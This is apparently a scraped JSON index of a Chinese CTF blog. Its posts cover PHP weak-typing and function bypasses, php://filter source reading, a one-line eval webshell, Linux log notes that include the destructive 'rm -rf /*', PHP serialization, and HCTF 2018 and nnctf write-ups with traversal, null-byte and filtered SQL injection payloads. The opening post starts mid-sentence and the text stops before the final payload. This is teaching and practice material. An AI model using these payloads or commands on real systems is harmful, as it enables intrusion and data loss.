如果以上变量函数可控且未经处理，可执行恶意代码 $GLOBALS$GLOBALS：是一个数组，包含了全局作用域中可用的全部变量。变量的名字就是数组的键。合理利用$GLOBALS全局变量也许可以获得可利用变量信息。常与var_dump()函数连用。 php://伪协议php://filter伪协议php://filter 的参数列表 read 读取 write 写入 resource 数据来源(必须的) read参数值可以为 string.stip_tags 将数据流中的HTML标签清除 string.toupper 将数据流中的内容转换为大写 string.tolower 将数据流中的内容转换为小写 convert.base64-encode 将数据流中的内容转换为base64编码 convertr.base64-decode 与上面对应的解码 利用这个函数漏洞需和文件包含漏洞一起使用，可以读取网页的PHP源代码 index.php?file=php://filter/read=convert.base64-encode/resource=index.php php://input 一句话木马php://input 用来接收post数据的 可以接收一句话木马&lt;?php eval($_POST[‘a’]); ?&gt;","categories":[{"name":"web","slug":"web","permalink":"http://yoursite.com/categories/web/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://yoursite.com/tags/CTF/"}]},{"title":"PHP的黑魔法","slug":"PHP的黑魔法","date":"2019-03-10T07:18:34.261Z","updated":"2019-05-29T12:33:02.793Z","comments":true,"path":"2019/03/10/PHP的黑魔法/","link":"","permalink":"http://yoursite.com/2019/03/10/PHP的黑魔法/","excerpt":"弱比较若字符串以数字开头，则取开头数字作为转换结果，若无则输出0 &#39;123abc&#39; == 123","text":"弱比较若字符串以数字开头，则取开头数字作为转换结果，若无则输出0 &#39;123abc&#39; == 123 md5(),sha1()md5()是不能处理数组的 md5(数组)会返回null，两个null相等绕过 md5([1]) == md5([2]) sha1()函数也是这样 md5($pass,true)可以让pass=ffifdyop 绕过 intval()intval()转换的时候，会将从字符串的开始进行转换直到遇到一个非数字的字符。 即使出现无法转换的字符串也不会报错的，会直接返回0 var_dump((int)(&#39;1e-1000&#39;)&gt;0); // 1&gt;0 echo &quot;&lt;br&gt;&quot;; var_dump(&#39;1e-1000&#39;&gt;0); echo &quot;&lt;br&gt;&quot;; 输出结果为： bool(true) bool(false) var_dump((int)(&#39;1e-10&#39;)&gt;0); echo &quot;&lt;br&gt;&quot;; var_dump(&#39;1e-10&#39;&gt;0); echo &quot;&lt;br&gt;&quot;; 输出结果为： bool(true) bool(true) strcmp()函数strcnp()函数只有在相等的情况下才会返回0 若果我们传入一个数组，他会返回NULL,而判断使用的是\\==而NULL==0是bool(true)，这样就成功绕过。 $a=[]; if(strcmp($a,&quot;haha&quot;)) { echo 1; }else{ echo 2; } 输出的结果 2 说明可以绕过strcmp()函数 ereg()函数字符串对比解析，ereg函数存在NULL截断漏洞，当ereg读取字符串string时,如果遇到了%00,后面的字符串就不会被解析。 is_numeric()函数 当有两个is_numeric判断并用and后面的is_numeric可以绕过 $a = []; $b = aaa; if(is_numeric($b) == is_numeric($a)) { echo 1; }else{ echo 2; } echo &quot;&lt;br&gt;&quot;; 输出结果 1 说明第二个变量我们可以任意输入，可以绕过 16进制也可以绕过is_numeric()检验，可以用来绕过sql注入里的过滤 $a = 8; $b = 0x8; if(is_numeric($a) == is_numeric($b)) { echo 1; }else{ echo 2; } echo &quot;&lt;br&gt;&quot;; 输出结果 1 说明可以绕过16进制也可以绕过 switch()函数当switch没有break时可以继续往下执行。这里也有自动转换，比如$switch_bug = a,会当0执行，$switch_bug =1a，会当1执行…… array_search()函数用到了PHP弱类型的一个特性，当一个整形和一个其他类型行比较的时候，会先把其他类型intval再比。 当检索中带入字符串，比如”sky”，会intval(‘sky’)==0，从而致使数字数组也可以查询成功 $array_search=[&#39;haha&#39;,&#39;hehe&#39;,0]; $eee = @array_search(&quot;XMAN&quot;, $array_search); if($eee){ echo &quot;array_search()检索字符串绕过成功&quot;; }else{ echo &quot;array_search()检索字符串绕过失败&quot;; } 输出结果： array_search()检索字符串绕过成功","categories":[{"name":"web","slug":"web","permalink":"http://yoursite.com/categories/web/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://yoursite.com/tags/PHP/"}]},{"title":"linux 日志分析","slug":"linux-日志分析","date":"2019-01-09T08:19:07.000Z","updated":"2019-05-29T12:32:25.686Z","comments":true,"path":"2019/01/09/linux-日志分析/","link":"","permalink":"http://yoursite.com/2019/01/09/linux-日志分析/","excerpt":"","text":"linux 日志分析Linux 基础命令一些常用的linux命令 cd 切换目录 cd / 回到根目录 ls 查看当前文件夹下的内容 ls -a 显示所有文件，包括隐藏文件 ls -l 显示文件的详细信息 cat 查看文件内容 pwd 显示当前工作路径 cp filename newfilename 复制文件，可以加上路径 mv filename filename 剪切文件，第一个是原文件路径，第二个是目标文件的路径，如果不加路径，相当于重命名 mkdir name 新建文件夹 vi/vim filename 编辑或者是新建一个文件 name -r 显示linux内核版本 cat /proc/version 查看当前操作系统版本信息 cat /etc/lsb-release 查看具体发行版本信息等等 cat /etc/issue lsb_release whoami 查看当前用户身份 id 查看当前用户分组 rm -rf filename 删除命令 rm -rf /* 自毁命令 日志文件一些重要的日志文件 history 查看最近执行的命令 etc/httpd/access_log web的系统日志 etc/httpd/ 这个文件下都是web的日志 var/log/ 这个文件下面都是linux系统的日志 var/log/wtmp 记录每个用户的登录次数和持续的时间等信息 var/log/btmp 记录登陆失败的信息 var/log/utmp 用户登陆信息 var/log/secure Linux系统安全日志，记录用户和工作组变坏情况、用户登陆认证情况 var/log/messages 记录Linux操作系统常见的系统和服务错误信息 /var/log/maillog 该日志文件记录了每一个发送到系统或从系统发出的电子邮件的活动。它可以用来查看用户使用哪个系统发送工具或把数据发送到哪个系统 /var/log/xferlog 该日志文件记录FTP会话，可以显示出用户向FTP服务器或从服务器拷贝了什么文件。该文件会显示用户拷贝到服务器上的用来入侵服务器的恶意程序，以及该用户拷贝了哪些文件供他使用 last 列出当前以及曾经登入系统的用户信息，其实读取的还是wtmp文件 lastlog 列出所有用户最近登录的信息(登录时间，登陆ip等)，或者指定用户的最近登录信息 lastb 列出失败尝试的登陆信息 w 查看当前登入系统的用户信息及用户当前的进程 tail -f -n -d xxx_log 如果日志还在更新，可以用该条命令实时查看,-d表示不同地方，-n多少秒刷新一次 感觉比较重要的常用的日志文件就这么多吧。其他的遇见了再总结！","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/tags/linux/"}]},{"title":"HCTF 2018 wp","slug":"HCTF-2018-wp","date":"2019-01-08T15:50:09.000Z","updated":"2019-06-05T09:01:04.701Z","comments":true,"path":"2019/01/08/HCTF-2018-wp/","link":"","permalink":"http://yoursite.com/2019/01/08/HCTF-2018-wp/","excerpt":"HCTF2018","text":"HCTF2018 web 签到题 warmup点击之后发现是个文件包含类型的 url:http://warmup.2018.hctf.io/index.php?file=hint.php source.php的源码也有 &lt;?php class emmm { public static function checkFile(&amp;$page) { $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;]; if (! isset($page) || !is_string($page)) { echo &quot;you can&#39;t see it&quot;; return false; } if (in_array($page, $whitelist)) { return true; } $_page = mb_substr( $page, 0, mb_strpos($page . &#39;?&#39;, &#39;?&#39;) ); if (in_array($_page, $whitelist)) { return true; } $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . &#39;?&#39;, &#39;?&#39;) ); if (in_array($_page, $whitelist)) { return true; } echo &quot;you can&#39;t see it&quot;; return false; } } if (! empty($_REQUEST[&#39;file&#39;]) &amp;&amp; is_string($_REQUEST[&#39;file&#39;]) &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;]) ) { include $_REQUEST[&#39;file&#39;]; exit; } else { echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;; } ?&gt; 可以看到对我们传入的参数一定的要求 if (!empty($_REQUEST[&#39;file&#39;]) &amp;&amp;is_string($_REQUEST[&#39;file&#39;]) &amp;&amp;emmm::checkFile($_REQUEST[&#39;file&#39;]) ) 发现只有source.php hint.php 才能绕过截取 $whitelist=[&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;]; 截取函数 截取你传入参数?前的内容 $_page = mb_substr( $_page, 0, mb_strpos($_page . &#39;?&#39;, &#39;?&#39;) 判断截取的内容是否在数组whitelist里面 if (in_array($_page, $whitelist)) { return true; } echo &quot;you can&#39;t see it&quot;; return false; 所以要利用?截取处hint.php或者source.php，利用hint。php成为一个不存在的目录，最后include利用../../跳出目录来读取flag payload: index.php?file=source.php?/../../../../ffffllllaaaagggg index.php?file=hint.php?/../../../../ffffllllaaaagggg ps 直接把source的源码复制搜索就可以找到这个漏洞 受影响版本: phpMyAdmin4.8.0 phpMyAdmin4.8.1 https://blog.csdn.net/nzjdsds/article/details/81260335 Game注册账号进去之后发现，他将所有的用户名的列了出来 http://game.2018.hctf.io/web2/user.php?order=id 通过URL发现排序的方式是可控的所以我们让他按密码排序 http://game.2018.hctf.io/web2/user.php?order=password 然后通过建立不同的账号密码来确定admin的密码 admin的账号的id为1 这是网上大佬批量注册账号的代码通过这个账号来手工测试密码 import requests import hashlib import threading def md5(str): sha = hashlib.md5(str) encrypts = sha.hexdigest() return encrypts def reg(username,password): url = &#39;http://game.2018.hctf.io/web2/action.php?action=reg&#39; data = { &quot;username&quot;:username, &quot;password&quot;:password, &quot;sex&quot;:&quot;1&quot;, &quot;submit&quot;:&quot;submit&quot; } headers = { &#39;Connection&#39;: &#39;close&#39;, } r = requests.post(url=url,data=data,headers=headers) def fuzz(start,end): for i in range(start,end): password = &#39;dSa8&amp;&amp;!@#$%^&amp;d1nGy1aS3dj&#39;+chr(i) username=md5(password) content = username + &quot; &quot; + password +&quot; &quot;+ str(i) + &quot;\\n&quot; reg(username, password) print content print str(start)+&#39;~&#39;+str(end)+&quot;complete&quot; step=20 for i in range(33,127,step): t = threading.Thread(target=fuzz, args=(i, i+step)) t.start() 注册好多号不断的逼近admin的密码，登录后访问flag.php【user.php里有提示】，拿到flag。","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://yoursite.com/tags/writeup/"}]},{"title":"初识php反序列化","slug":"初识php反序列化","date":"2019-01-08T15:39:38.000Z","updated":"2019-06-05T09:02:11.193Z","comments":true,"path":"2019/01/08/初识php反序列化/","link":"","permalink":"http://yoursite.com/2019/01/08/初识php反序列化/","excerpt":"php的序列化与反序列化关于这个时有两个函数的 serialize()和unserialize()","text":"php的序列化与反序列化关于这个时有两个函数的 serialize()和unserialize() serialize()函数当在php创建了一个对象后，可以通过serialize()函数把这个对象转变成一个字符串，保存对象的值方便之后的传递与使用。 序列化格式整形的序列化格式&lt;?php $number = 34; var_dump(serialize($number)); ?&gt; 输出结果为： string(5) &quot;i:34;&quot; 解释： 因为serialize()函数所以输出的是一个字符串类型的 i表示integer类型 34就是变量的值 doule类型的序列化格式&lt;?php $double = 5.5; var_dump(serialize(double)); ?&gt; 输出结果为： string(6) &quot;d:5.5;&quot; 解释 d 表示double类型 5.5 为变量的值 string类型的序列化格式&lt;?php $str = &#39;chuddy&#39;; var_dump(serialize($str)); echo &quot;&lt;br&gt;&quot;; ?&gt; 输出结果为： string(13) &quot;s:6:&quot;chuddy&quot;;&quot; 解释： s 代表string类型 chuddy 为变量的值 布尔类型的序列化格式&lt;?php $bool = true; $bool_1 = false; var_dump(serialize($bool)); echo &quot;&lt;br&gt;&quot;; var_dump(serialize($bool_1)); echo &quot;&lt;br&gt;&quot;; ?&gt; 输出结果： string(4) &quot;b:1;&quot; string(4) &quot;b:0;&quot; 解释： b 表示布尔类型 1 表示布尔变量的值为true 0 表示布尔类型的值为false null类型的序列化格式&lt;?php $null = null; var_dump(serialize($null)); ?&gt; 输出结果： string(2) &quot;N;&quot; 解释 N 代表的null类型 数组类型的序列化格式&lt;?php $arr = array(&#39;a&#39; =&gt; 1, &#39;b&#39; =&gt; 2); var_dump(serialize($arr)); echo &quot;&lt;br&gt;&quot;; ?&gt; 输出结果： string(30) &quot;a:2:{s:1:&quot;a&quot;;i:1;s:1:&quot;b&quot;;i:2;}&quot; 解释： a 表示array类型 2 表示数组的长度 {} 内的时数组各个值得类型，长度以及值 类的序列化格式&lt;?php class chuddy { public $data; private $pass; public function __construct($data, $pass) { $this-&gt;data = $data; $this-&gt;pass = $pass; } } $cc = new chuddy(&#39;chuddy&#39;, &#39;haha&#39;); var_dump(serialize($cc)); ?&gt; 输出结果为： string(72) &quot;O:6:&quot;chuddy&quot;:2:{s:4:&quot;data&quot;;s:6:&quot;chuddy&quot;;s:12:&quot;chuddypass&quot;;s:4:&quot;haha&quot;;}&quot; 解释： O 代表对象类型 2 代表类里的变量多少 序列化对象class CB { public $CB_data = &#39;cb&#39;; } class CC extends CB{ const SECOND = 60; public $data; private $pass; public function __construct($data, $pass) { $this-&gt;data = $data; $this-&gt;pass = $pass; } public function setPass($pass) { $this-&gt;pass = $pass; } } $cc = new CC(&#39;uu&#39;, true); var_dump(serialize($cc)); 输出结果为： string(75) &quot;O:2:&quot;CC&quot;:3:{s:4:&quot;data&quot;;s:2:&quot;uu&quot;;s:8:&quot; CC pass&quot;;b:1;s:7:&quot;CB_data&quot;;s:2:&quot;cb&quot;;}&quot; 序列化对象时，不会保存常量的值。对于父类中的变量，则会保留。 对象序列化自定义在序列化对象时，有一些敏感数据，我们不需要保存，这里该如何处理呢 在我们调用serialize()函数时，该函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化的操作。可以通过重载这个方法，从而自定义序列化行为 class User{ const SITE = &#39;uusama&#39;; public $username; public $nickname; private $password; public function __construct($username, $nickname, $password) { $this-&gt;username = $username; $this-&gt;nickname = $nickname; $this-&gt;password = $password; } // 重载序列化调用的方法 public function __sleep() { // 返回需要序列化的变量名，过滤掉password变量 return array(&#39;username&#39;, &#39;nickname&#39;); } } $user = new User(&#39;uusama&#39;, &#39;uu&#39;, &#39;123456&#39;); var_dump(serialize($user)); 返回结果为： string(67) &quot;O:4:&quot;User&quot;:2:{s:8:&quot;username&quot;;s:6:&quot;uusama&quot;;s:8:&quot;nickname&quot;;s:2:&quot;uu&quot;;}&quot; 这样就忽略了password字段的值 可以保护敏感数据 总结所以序列化对于不同类型得到的字符串格式为： String : s:size:value; Integer : i:value; Boolean : b:value;(保存1或0) Null : N; Array : a:size:{key definition;value definition;(repeated per element)} Object : O:strlen(object name):object name:object size:{s:strlen(property name):property name:property definition;(repeated per property)} 反序列化反序列化函数unserialize()反序列化函数用于将单一的已序列化的变量转换回PHP的值注意： 如果传递的字符串不可解序列化，则返回false，并产生一个E_NOTICE 返回的是转换之后的值，可为integer、float、string、array或object 若被反序列化的变量时一个对象，在成功重新构造对象之后，PHP会自动的试图去调用__wakeup()成员函数（如果存在的话） class User{ const SITE = &#39;uusama&#39;; public $username; public $nickname; private $password; public function __construct($username, $nickname, $password) { $this-&gt;username = $username; $this-&gt;nickname = $nickname; $this-&gt;password = $password; } // 重载序列化调用的方法 public function __sleep() { // 返回需要序列化的变量名，过滤掉password变量 return array(&#39;username&#39;, &#39;nickname&#39;); } public function __wakeup() { $this-&gt;password = $this-&gt;username; } } $user_ser = &#39;O:4:&quot;User&quot;:2:{s:8:&quot;username&quot;;s:6:&quot;uusama&quot;;s:8:&quot;nickname&quot;;s:2:&quot;uu&quot;;}&#39;; var_dump(unserialize($user_ser)) 输出结果： object(User)#3 (3) { [&quot;username&quot;]=&gt; string(6) &quot;uusama&quot; [&quot;nickname&quot;]=&gt; string(2) &quot;uu&quot; [&quot;password&quot;:&quot;User&quot;:private]=&gt; string(6) &quot;uusama&quot; } 我也尝试了一下没有__wakeup()的情况 输出结果为： object(User)#3 (3) { [&quot;username&quot;]=&gt; string(6) &quot;uusama&quot; [&quot;nickname&quot;]=&gt; string(2) &quot;uu&quot; [&quot;password&quot;:&quot;User&quot;:private]=&gt; NULL } __wakeup()函数在对象被构建以后执行，所以$this-&gt;username的值不为空 反序列化时，会尽量将变量值进行匹配并复制给序列化后的对象 未定义的类的处理$user_ser = &#39;O:4:&quot;haha&quot;:2:{s:8:&quot;username&quot;;s:6:&quot;uusama&quot;;s:8:&quot;nickname&quot;;s:2:&quot;uu&quot;;}&#39;; var_dump(unserialize($user_ser)); echo &quot;&lt;br&gt;&quot;; haha这个类是没有定义的 但是还能正常输出 没有报错 输出结果为： object(__PHP_Incomplete_Class)#3 (3) { [&quot;__PHP_Incomplete_Class_Name&quot;]=&gt; string(4) &quot;haha&quot; [&quot;username&quot;]=&gt; string(6) &quot;uusama&quot; [&quot;nickname&quot;]=&gt; string(2) &quot;uu&quot; } 有两种方案进行修复 定义__autoload()等函数，指定发现未定义类时加载类的定义文件 可通过 php.ini、ini_set() 或 .htaccess 定义unserialize_callback_func。每次实例化一个未定义类时它都会被调用 // unserialize_callback_func 从 PHP 4.2.0 起可用 ini_set(&#39;unserialize_callback_func&#39;, &#39;mycallback&#39;); // 设置您的回调函数 function mycallback($classname) { // 只需包含含有类定义的文件 // $classname 指出需要的是哪一个类 } // 建议使用下面的函数，代替__autoload() spl_autoload_register(function ($class_name) { // 动态加载未定义类的定义文件 require_once $class_name . &#39;.php&#39;; }); 附上参考链接 http://uusama.com/663.html","categories":[],"tags":[{"name":"web漏洞","slug":"web漏洞","permalink":"http://yoursite.com/tags/web漏洞/"}]},{"title":"linux的基本操作","slug":"linux的基本操作","date":"2018-12-09T08:20:04.000Z","updated":"2019-05-29T12:32:10.074Z","comments":true,"path":"2018/12/09/linux的基本操作/","link":"","permalink":"http://yoursite.com/2018/12/09/linux的基本操作/","excerpt":"","text":"linuxLinux 文件系统是一个目录树的结构，文件系统结构从一个根目录开始，根目录下可以有任意多个文件和子目录，子目录中又可以有任意多个文件和子目录 bin 存放二进制可执行文件(ls,cat,mkdir等) boot 存放用于系统引导时使用的各种文件 dev 用于存放设备文件 etc 存放系统配置文件 home 存放所有用户文件的根目录 lib 存放跟文件系统中的程序运行所需要的共享库及内核模块 mnt 系统管理员安装临时文件系统的安装点 opt 额外安装的可选应用程序包所放置的位置 proc 虚拟文件系统，存放当前内存的映射 root 超级用户目录 sbin 存放二进制可执行文件，只有root才能访问 tmp 用于存放各种临时文件 usr 用于存放系统应用程序，比较重要的目录/usr/local 本地管理员软件安装目录 var 用于存放运行时需要改变数据的文件 对目录的操作lsls -a 可以显示全部文档 包括隐藏文档都会背一起列出来 ls -d 仅仅列出目录本身 而不是列出目录内的文件数据 ls -l 可以显示 文件的属性与权限等等 其中这些在后面可以见 地址来列出 其他文件的信息 ls -al /var/www 显示为 www目录下的文件信息 drwxr-xr-x 3 root root 4096 3月 19 22:36 . drwxr-xr-x 15 root root 4096 3月 19 20:39 .. drwxr-xr-x 3 root root 4096 3月 20 19:37 html lrwxrwxrwx 1 root root 21 3月 19 22:36 phpmyadmin -&gt; /usr/share/phpmyadmin pwd显示目录所在位置 mkdirmkdir 目录名 创建新目录 mkdir -p /text1/text2/text3/text4 可以递归创建你所需要的目录 mkdir -m 711 text2 创建权限为rwx--x--x 的目录 rmdirrmdir 目录名 删除空目录 rmdir -p 目录名 连同上一级空的目录也一起删除 cp拷贝文件和目录 cp 参数 来源位置 目标位置 参数如下： -a：相当於 -pdr 的意思，至於 pdr 请参考下列说明；(常用) -d：若来源档为连结档的属性(link file)，则复制连结档属性而非文件本身； -f：为强制(force)的意思，若目标文件已经存在且无法开启，则移除后再尝试一次； -i：若目标档(destination)已经存在时，在覆盖时会先询问动作的进行(常用) -l：进行硬式连结(hard link)的连结档创建，而非复制文件本身； -p：连同文件的属性一起复制过去，而非使用默认属性(备份常用)； -r：递归持续复制，用於目录的复制行为；(常用) -s：复制成为符号连结档 (symbolic link)，亦即『捷径』文件； -u：若 destination 比 source 旧才升级 destination ！ rmrm [-fir] 文件或目录 -f : 就是force的意思，忽略不存在的文件，不会有警告信息 -i : 互动模式，在删除前会询问使用者的意见 -r : 递归删除。最常见的是在目录里面删除了，比较危险 mv(移动文件或目录，或修改名称)mv 文件 目录 把文件移动到目录下 mv 目录名字 目录新名字 目录该名称 Linux文件内容查看cat 由第一行开始显示文件内容 tac 有最后一行开始显示文件内容 nl 显示的时候，顺着输出行号 more 一页一页的显示文件内容 less 与more相似，但比more更好的是可以向前翻页 head 只看头几行 tail 只看尾几行 cat-b 列出行号，仅针对非空白行做行号显示，空白行不标行号 head tailhead -n 10 1.txt 显示1.txt头十行的内容 tail -n 10 1.txt 显示1.txt尾巴十行的内容 Linux磁盘管理df : 列出文件系统的整体磁盘使用量 du : 检查磁盘空间使用量 fdisk : 用于磁盘分区 df常见的参数 -a : 列出所有的文件系统，包括系统特有的文件系统 -k : 以KBytes的容量来显示各文件系统 -m : 以MBytes的容量来显示各文件系统 -h : 艺人们较易阅读的格式自行显示 -H : 以M=1000K 取代 M=1024k 的进位方式 -T : 显示文件系统类型，连同该partitio的filesystem名称也列出 -i : 不用硬盘容量，而以inode的数量来显示 du常见的参数 -a ：列出所有的文件与目录容量，因为默认仅统计目录底下的文件量而已。 -h ：以人们较易读的容量格式 (G/M) 显示； -s ：列出总量而已，而不列出每个各别的目录占用容量； -S ：不包括子目录下的总计，与 -s 有点差别。 -k ：以 KBytes 列出容量显示； -m ：以 MBytes 列出容量显示； 特殊符号表特殊符号 代表意义 [:alnum:] 代表英文大小写字符及数字，亦即 0-9, A-Z, a-z [:alpha:] 代表任何英文大小写字符，亦即 A-Z, a-z [:blank:] 代表空格键不 [Tab] 按键两者 [:cntrl:] 代表键盘上面的控制按键，亦即包括 CR, LF, Tab, Del.. 等等 [:digit:] 代表数字而已，亦即 0-9 [:graph:] 除了空格符 (空格键不 [Tab] 按键) 外的其他所有按键 [:lower:] 代表小写字符，亦即 a-z [:print:] 代表任何可以被打印出来的字符 [:punct:] 代表标点符号 (punctuation symbol)，亦即：” ‘ ? ! ; : # $… [:upper:] 代表大写字符，亦即 A-Z [:space:] 任何会产生空白的字符，包括空格键, [Tab], CR 等等 [:xdigit:] 代表 16 进位的数字类型，因此包括： 0-9, A-F, a-f 的数字不字符 grep进阶的选项与参数[root@www ~]# grep [-acinv] [--color=auto] &#39;搜寻字符串&#39; filename 选项与参数： -a ：将 binary 档案以 text 档案的方式搜寻数据 -c ：计算找到 &#39;搜寻字符串&#39; 的次数 -i ：忽略大小写的不同，所以大小写视为相同 -n ：顺便输出行号 -v ：反向选择，亦即显示出没有 &#39;搜寻字符串&#39; 内容的那一行！ --color=auto ：可以将找到的关键词部分加上颜色的显示！ -A ：后面可加数字，为 after 的意思，除了列出该行外，后续的 n 行也列出来； -B ：后面可加数字，为 befer 的意思，除了列出该行外，前面的 n 行也列出 练习1.搜索特定字符 cat 1.txt| grep -n &#39;chuddy&#39; grep -n &#39;chuddy&#39; 1.txt # 才知道grep可以直接获得文件的内容，然后进行分析 grep -vn &#39;chuddy&#39; 1.txt 利用中括号[]来搜寻集合字符 grep -n &#39;t[ae]st&#39; chuddy.txt grep -n &#39;[^g]oo&#39; chuddy.txt grep -n &#39;[^a-z]oo&#39; chuddy.txt grep -n &#39;[0-9]&#39; chuddy.txt grep -n &#39;[^[:lower:]]oo&#39; chuddy.txt grep -n &#39;[[:digit:]]&#39; chuddy.txt 3.行首与行尾字符(^ $) 行首(^) grep -n &#39;^the&#39; chuddy.txt grep -n &#39;^[a-z]&#39; chuddy.txt grep -n &#39;^[[:lower:]]&#39; chuddy.txt grep -n &#39;^[^a-zA-Z]&#39; chuddy.txt 行尾($) 找出行尾为‘.’的行。 grep -n &#39;\\.$&#39; chuddy.txt 找出空白行 grep -n &#39;^$&#39; chuddy.txt","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/tags/linux/"}]},{"title":"nnctf writeup","slug":"nnctf-writeup","date":"2018-12-08T15:14:44.000Z","updated":"2019-05-29T12:32:53.008Z","comments":true,"path":"2018/12/08/nnctf-writeup/","link":"","permalink":"http://yoursite.com/2018/12/08/nnctf-writeup/","excerpt":"南宁nnctf web wp","text":"南宁nnctf web wp 超简单打开发现给出了源码 &lt;?php $white_list = range(0,9); require_once(&#39;flag.php&#39;); if(isset($_REQUEST[&#39;no&#39;])){ $a=$_REQUEST[&#39;no&#39;]; if(@ereg(&quot;^[0-9]+$&quot;, $a) === FALSE){ echo &#39;no must be number&#39;; }else{ if(in_array($a,$white_list)){ if(strlen($a)&gt;1){ echo &#39;you are a great dark phper&lt;br&gt;&#39;; echo &quot;&lt;img src=&#39;dark.gif&#39;&gt;&lt;br&gt;&quot;; echo $flag; }else{ echo &#39;you no dark&#39;; } }else{ echo &#39;you are so dark&#39;; } } }else highlight_file(__FILE__); 代码分析： 传递了一个no参数 正则匹配 只能是数字 设置了白名单 长度大于一 playload: ?no=1%00 sql?这个是一个源码泄露但是因为工具的原名跑不出来源码 网上用大佬的工具跑出来了 &lt;?php $flag = &#39;gxnnctf{***************************}&#39;; require_once(&#39;config.php&#39;); $conn = new mysqli($db_servername,$db_username,$db_password,$db_name); if($conn-&gt;connect_error){ die(&quot;Connect failed:&quot;.$conn-&gt;connect_error); } if(isset($_GET[&#39;id&#39;])){ $id = $_GET[&#39;id&#39;]; if(preg_match(&#39;#sleep|benchmark|floor|rand|count|select|from|\\(|\\)|time|date|sec|day#is&#39;,$id)) die(&#39;Don\\&#39;t hurt me :-(&#39;); $sql = &quot;select username from user where id = &quot;.$id; $result = $conn-&gt;query($sql); if($result){ $row = $result-&gt;fetch_array(); }else{ echo mysqli_error($conn); die(); } echo(&#39;hello &#39;.$row[&#39;username&#39;].&#39;&lt;br&gt;&#39;); $username = $row[&#39;username&#39;]; if($username === &#39;guest&#39;){ $ip = @$_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]!=&quot;&quot; ? $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]:$_SERVER[&#39;REMOTE_ADDR&#39;]; if(preg_match(&#39;#sleep|benchmark|floor|rand|count|select|from|\\(|\\)|time|date|sec|day#is&#39;,$ip)){ die(&#39;Don\\&#39; hack me&#39;); } if(!empty($ip)){ echo &#39;you from &#39;.$ip.&#39; , I remembered it.&lt;br&gt;&#39;; $conn-&gt;query(&quot;insert into logs(ip) values(&#39;$ip&#39;)&quot;); } $result = $conn-&gt;query(&quot;select username from user where id =&quot;.$id); $row = $result-&gt;fetch_array(); $username = $row[&#39;username&#39;]; if($username === &#39;admin&#39;){ var_dump($_GET[&#39;backdoor&#39;]); if(isset($_GET[&#39;backdoor&#39;])&amp;&amp;$_GET[&#39;backdoor&#39;]===&#39;Melonrind&#39;){ echo &#39;you find the backdoor!!!&lt;br&gt;&#39;; die($flag); }else{ echo &quot;you are so great,but you don\\&#39;t have backdoor,so continue to challenge :(&quot;; } }else{ echo &quot;but i don\\&#39;t waiting for you &quot;; } }else{ echo &#39;emmmmm&#39;; } }else{ echo &#39;welcome to gxnnctf2018!&lt;br&gt;&#39;; echo &#39;i filtered everything,so have a good time :)&#39;; } 分析代码： $result = $conn-&gt;query(&quot;select username from user where id =&quot;.$id); $row = $result-&gt;fetch_array(); $username = $row[&#39;username&#39;]; if($username === &#39;guest&#39;){ $ip = @$_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]!=&quot;&quot; ? $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]:$_SERVER[&#39;REMOTE_ADDR&#39;]; if(preg_match(&#39;#sleep|benchmark|floor|rand|count|select|from|\\(|\\)|time|date|sec|day#is&#39;,$ip)){ die(&#39;Don\\&#39; hack me&#39;); } if(!empty($ip)){ echo &#39;you from &#39;.$ip.&#39; , I remembered it.&lt;br&gt;&#39;; $conn-&gt;query(&quot;insert into logs(ip) values(&#39;$ip&#39;)&quot;); } $result = $conn-&gt;query(&quot;select username from user where id =&quot;.$id); $row = $result-&gt;fetch_array(); $username = $row[&#39;username&#39;]; if($username === &#39;admin&#39;){ var_dump($_GET[&#39;backdoor&#39;]); if(isset($_GET[&#39;backdoor&#39;])&amp;&amp;$_GET[&#39;backdoor&#39;]===&#39;Melonrind&#39;){ echo &#39;you find the backdoor!!!&lt;br&gt;&#39;; die($flag); 这些能够得到flag 进行第一次的select语句 查询结果是2 也就是guest 才能进行下列的操作 然后进行第二次的查询语句 如果结果为1 也就是admin get传递参数backdoor === Melonrind 这样才能显示flag 发现这个过滤了好多东西 常用的注入都不能进行了 后来看别人的writeup 使用了 case when then end 的查询 类似这样能得到两个我们所需要的结果 但是因为过滤了空格 我们可以使用%20代替 于是构建playload: ?id=case%20when%20@a%20is%20null%20then%20@a:=2%20else%20@a:=@a-1%20end&amp;backdoor=Melonrind 这样就能得到flag web进入题目发现源代码： &lt;?php //include(&quot;./class.php&quot;); header(&quot;content-type:text/html;charset=utf-8&quot;); error_reporting(0); if(isset($_GET[&quot;file&quot;])){ $file = $_GET[&quot;file&quot;]; if(isset($_GET[&quot;password&quot;])){ $password = $_GET[&quot;password&quot;]; if(preg_match(&quot;/flag/&quot;,$file)){ echo &quot;不能现在就给你flag哦&quot;; exit(); }else{ require_once($file); highlight_file(&quot;$file&quot;); $password = unserialize($password); echo $password; } }else{ echo &quot;需要密码的！&lt;br&gt;&quot;; } }else{ highlight_file(&#39;./index.php&#39;); } if(preg_match(&quot;/flag/&quot;,$file)){ echo &quot;不能现在就给你flag哦&quot;; exit(); }else{ include($file); $password = unserialize($password); echo $password; } ?&gt; 可见是代码审计。 提示class.php故get传参file=class.php看到需要密码，继续传参password=1（任意值）发现class.php的源码： &lt;!-- hello friend! --&gt; &lt;?php class Flag{//flag_good.php public $file; public function __tostring(){ if(isset($this-&gt;file)){ echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;good&lt;br&gt;&quot;); } } } ?&gt; 根据两个代码和提示flag_good.php，构造playload: 